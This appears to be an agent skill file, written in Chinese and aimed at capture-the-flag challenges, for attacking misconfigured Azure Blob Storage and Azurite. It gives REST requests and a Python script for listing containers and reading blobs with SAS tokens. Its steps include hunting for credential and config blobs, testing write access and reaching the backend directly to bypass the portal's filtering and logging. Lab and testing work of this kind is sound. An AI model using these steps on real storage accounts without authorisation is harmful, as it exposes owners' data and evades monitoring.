---
name: Azure Blob Storage Misconfiguration
description: Azure Blob Storage / Azurite 攻击面识别、SAS 滥用、容器列举与 blob 读取
 triggers: azure, azurite, blob, sas, container, storage, devstoreaccount, azure storage, azure blob
---

# Azure Blob Storage / Azurite 打法

## 识别

目标出现以下特征时大概率是 Azure Blob 或 Azurite 模拟器：

- 响应包含 `<?xml version="1.0" encoding="UTF-8"?>` 和 `<Error><Code>BlobNotFound</Code>...`
- SAS Token 字段：`se=`、`sp=`、`sv=`、`ss=`、`srt=`、`sig=`
- endpoint 形如 `http://azurite:10000/devstoreaccount1/...` 或 `https://<account>.blob.core.windows.net/...`
- REST API 路径包含 `/<container>/<blob>`

## 关键 API

### 列出容器（Account 级别）

```
GET http://<account>.blob.core.windows.net/?comp=list
Authorization: Bearer <token> 或 SharedKey
```

Azurite 本地版：

```
GET http://azurite:10000/devstoreaccount1/?comp=list
```

### 列出容器内 Blob

```
GET http://<account>.blob.core.windows.net/<container>?restype=container&comp=list
```

Azurite 本地版：

```
GET http://azurite:10000/devstoreaccount1/<container>?restype=container&comp=list
```

### 读取 Blob

```
GET http://<account>.blob.core.windows.net/<container>/<blob>
```

带 SAS：

```
GET http://<account>.blob.core.windows.net/<container>/<blob>?<sas_token>
```

## 攻击路径

1. **获取 SAS Token**：如果目标 portal 有 `/api/sas/generate`，先拿到 token 和真实 endpoint。
2. **判断权限**：`sp=` 字段里 `r=read`, `w=write`, `d=delete`, `l=list`, `a=append`, `c=create`。`l` 存在时优先 list。
3. **list 容器 → list blob → 读取敏感 blob**：常见敏感名：`flag`, `flag.txt`, `secret`, `config`, `credentials`, `report`, `data`, `backup`。
4. **SAS 过度授权**：如果 `sp=rwdlac` 全部都有，可尝试写 blob 再读回，验证是否可写。
5. **直连后端**：如果 portal 暴露了真实 endpoint（如 `azurite:10000`），尝试绕过 portal 直接访问，可能绕过后端过滤/日志。

## 常见错误避免

- 不要假设 blob 名是 `flag` 或 `flag.txt`，先 list 再读。
- 不要把 `restype=container&comp=list` 参数放到 blob 段，Azure 会把它当成 blob 名的一部分。
- URL 中的 `?` 和 `&` 需要正确拼接：已存在 `?sas=...` 时用 `&` 追加参数。
- 如果 portal 返回 `AuthorizationFailure`，先检查是否把 `sas` 参数漏了或拼错。

## 快速脚本模板

```python
import requests, urllib.parse
base = "http://azurite:10000/devstoreaccount1"
sas = "<sas_token>"

# list containers
r = requests.get(f"{base}/?comp=list", timeout=10)
print(r.status_code, r.text[:500])

# list blobs in container
container = "secret-vault"
url = f"{base}/{container}?restype=container&comp=list&{sas}"
r = requests.get(url, timeout=10)
print(r.status_code, r.text[:500])

# read blob
blob = "flag.txt"
url = f"{base}/{container}/{blob}?{sas}"
r = requests.get(url, timeout=10)
print(r.status_code, r.text[:500])
```
